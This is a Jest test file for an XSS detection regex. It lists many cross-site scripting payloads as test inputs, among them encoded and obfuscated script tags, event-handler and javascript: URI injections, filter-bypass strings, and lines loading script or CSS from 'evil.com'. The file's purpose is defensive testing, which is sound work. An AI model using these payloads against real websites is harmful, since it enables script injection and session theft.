/**
 * XSS Detection Regex Tests
 * Tests based on Ismail Tasdelen's XSS Payload Collection
 */

import {
  containsXSS,
  extractXSSPatterns,
  XSS_DETECTION_REGEX,
  XSS_SIMPLE_REGEX,
  XSS_AGGRESSIVE_REGEX,
  XSS_TEST_CASES,
} from './xss-regex';

describe('XSS Detection - Script Tags', () => {
  test('should detect basic script tags', () => {
    expect(containsXSS('<script>alert(1)</script>')).toBe(true);
    expect(containsXSS('<SCRIPT>alert(1)</SCRIPT>')).toBe(true);
    expect(containsXSS('<ScRiPt>alert(1)</ScRiPt>')).toBe(true);
  });

  test('should detect script tags with attributes', () => {
    expect(containsXSS('<script src="http://evil.com/xss.js"></script>')).toBe(true);
    expect(containsXSS('<script language="javascript">alert(1)</script>')).toBe(true);
  });

  test('should detect encoded script tags', () => {
    expect(containsXSS('&lt;script&gt;alert(1)&lt;/script&gt;')).toBe(true);
    expect(containsXSS('&#60;script&#62;alert(1)&#60;/script&#62;')).toBe(true);
  });

  test('should detect obfuscated script tags', () => {
    expect(containsXSS('<scr<script>ipt>alert(1)</scr</script>ipt>')).toBe(true);
    expect(containsXSS('<<SCRIPT>alert(1);//<</SCRIPT>')).toBe(true);
  });
});

describe('XSS Detection - JavaScript Protocol', () => {
  test('should detect javascript: protocol', () => {
    expect(containsXSS('javascript:alert(1)')).toBe(true);
    expect(containsXSS('JAVASCRIPT:alert(1)')).toBe(true);
    expect(containsXSS('JaVaScRiPt:alert(1)')).toBe(true);
  });

  test('should detect obfuscated javascript:', () => {
    expect(containsXSS('jav\nascript:alert(1)')).toBe(true);
    expect(containsXSS('jav\tascript:alert(1)')).toBe(true);
    expect(containsXSS('jav ascript:alert(1)')).toBe(true);
  });

  test('should detect encoded javascript:', () => {
    expect(containsXSS('&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)')).toBe(true);
  });
});

describe('XSS Detection - Event Handlers', () => {
  test('should detect onerror', () => {
    expect(containsXSS('<img src=x onerror=alert(1)>')).toBe(true);
    expect(containsXSS('<img src=x onerror="alert(1)">')).toBe(true);
    expect(containsXSS('<img src=x ONERROR=alert(1)>')).toBe(true);
  });

  test('should detect onload', () => {
    expect(containsXSS('<body onload=alert(1)>')).toBe(true);
    expect(containsXSS('<svg onload=alert(1)>')).toBe(true);
  });

  test('should detect onclick', () => {
    expect(containsXSS('<div onclick=alert(1)>Click</div>')).toBe(true);
  });

  test('should detect onmouseover', () => {
    expect(containsXSS('<div onmouseover=alert(1)>Hover</div>')).toBe(true);
  });

  test('should detect various event handlers', () => {
    expect(containsXSS('<input onfocus=alert(1)>')).toBe(true);
    expect(containsXSS('<form onsubmit=alert(1)>')).toBe(true);
    expect(containsXSS('<input onchange=alert(1)>')).toBe(true);
  });
});

describe('XSS Detection - Data URIs', () => {
  test('should detect data:text/html', () => {
    expect(containsXSS('data:text/html,<script>alert(1)</script>')).toBe(true);
  });

  test('should detect base64 encoded data URIs', () => {
    expect(containsXSS('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe(true);
  });
});

describe('XSS Detection - Dangerous Tags', () => {
  test('should detect iframe', () => {
    expect(containsXSS('<iframe src="javascript:alert(1)"></iframe>')).toBe(true);
  });

  test('should detect embed', () => {
    expect(containsXSS('<embed src="javascript:alert(1)">')).toBe(true);
  });

  test('should detect object', () => {
    expect(containsXSS('<object data="javascript:alert(1)"></object>')).toBe(true);
  });

  test('should detect svg', () => {
    expect(containsXSS('<svg/onload=alert(1)>')).toBe(true);
  });

  test('should detect meta refresh', () => {
    expect(containsXSS('<meta http-equiv="refresh" content="0;url=javascript:alert(1)">')).toBe(true);
  });
});

describe('XSS Detection - CSS Attacks', () => {
  test('should detect expression()', () => {
    expect(containsXSS('<div style="width:expression(alert(1))"></div>')).toBe(true);
  });

  test('should detect behavior:', () => {
    expect(containsXSS('<div style="behavior:url(xss.htc)"></div>')).toBe(true);
  });

  test('should detect @import', () => {
    expect(containsXSS('<style>@import"http://evil.com/xss.css";</style>')).toBe(true);
  });
});

describe('XSS Detection - Dangerous Functions', () => {
  test('should detect eval()', () => {
    expect(containsXSS('eval(alert(1))')).toBe(true);
  });

  test('should detect String.fromCharCode', () => {
    expect(containsXSS('String.fromCharCode(88,83,83)')).toBe(true);
  });

  test('should detect document.write', () => {
    expect(containsXSS('document.write("<script>alert(1)</script>")')).toBe(true);
  });

  test('should detect document.cookie', () => {
    expect(containsXSS('document.cookie')).toBe(true);
  });
});

describe('XSS Detection - Safe Inputs', () => {
  test('should allow normal text', () => {
    expect(containsXSS('Hello, World!')).toBe(false);
  });

  test('should allow emails', () => {
    expect(containsXSS('user@example.com')).toBe(false);
  });

  test('should allow URLs', () => {
    expect(containsXSS('https://www.example.com')).toBe(false);
  });

  test('should allow phone numbers', () => {
    expect(containsXSS('+1-234-567-8900')).toBe(false);
  });

  test('should allow addresses', () => {
    expect(containsXSS('123 Main Street, City, Country')).toBe(false);
  });
});

describe('XSS Detection - Edge Cases', () => {
  test('should handle empty strings', () => {
    expect(containsXSS('')).toBe(false);
  });

  test('should handle null/undefined', () => {
    expect(containsXSS(null as any)).toBe(false);
    expect(containsXSS(undefined as any)).toBe(false);
  });

  test('should handle numbers', () => {
    expect(containsXSS(123 as any)).toBe(false);
  });
});

describe('XSS Detection - Test Cases', () => {
  test('should detect all predefined test cases', () => {
    XSS_TEST_CASES.forEach(testCase => {
      expect(containsXSS(testCase)).toBe(true);
    });
  });
});

describe('XSS Detection - Extract Patterns', () => {
  test('should extract XSS patterns', () => {
    const input = '<script>alert(1)</script><img onerror=alert(2)>';
    const patterns = extractXSSPatterns(input);
    
    expect(patterns.length).toBeGreaterThan(0);
    expect(patterns).toContain('<script>');
  });

  test('should return empty array for safe input', () => {
    const patterns = extractXSSPatterns('Hello, World!');
    expect(patterns).toEqual([]);
  });
});

describe('XSS Detection - Strict Mode', () => {
  test('strict mode should be more aggressive', () => {
    const input = 'onclick';
    
    expect(containsXSS(input, false)).toBe(false); // Normal mode
    expect(containsXSS(input, true)).toBe(true);  // Strict mode
  });
});

describe('XSS Detection - Real World Examples', () => {
  test('should detect payload from screenshots', () => {
    // From user's screenshots
    expect(containsXSS('<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>')).toBe(true);
    expect(containsXSS('<marquee onstart="javascript:alert(\'Y\')>">')).toBe(true);
    expect(containsXSS('<a href="javas\\0\\0cript:javascript:alert(1)">')).toBe(true);
  });

  test('should detect form injection attempts', () => {
    expect(containsXSS('"><script>alert(1)</script>')).toBe(true);
    expect(containsXSS('\';alert(1);//')).toBe(true);
    expect(containsXSS('</textarea><script>alert(1)</script>')).toBe(true);
  });

  test('should detect common bypass techniques', () => {
    expect(containsXSS('<img src=x onerror=alert(1)//')).toBe(true);
    expect(containsXSS('<svg/onload=alert(1)>')).toBe(true);
    expect(containsXSS('<iframe src=javascript:alert(1)>')).toBe(true);
  });
});

describe('XSS Detection - Performance', () => {
  test('should handle large inputs efficiently', () => {
    const largeInput = 'Hello '.repeat(10000);
    const start = performance.now();
    containsXSS(largeInput);
    const end = performance.now();
    
    expect(end - start).toBeLessThan(100); // Should complete in < 100ms
  });

  test('should handle regex efficiently', () => {
    const inputs = [
      '<script>alert(1)</script>',
      'javascript:alert(1)',
      '<img onerror=alert(1)>',
      'Hello, World!',
      'user@example.com',
    ];

    const start = performance.now();
    inputs.forEach(input => containsXSS(input));
    const end = performance.now();
    
    expect(end - start).toBeLessThan(50); // Batch should complete quickly
  });
});
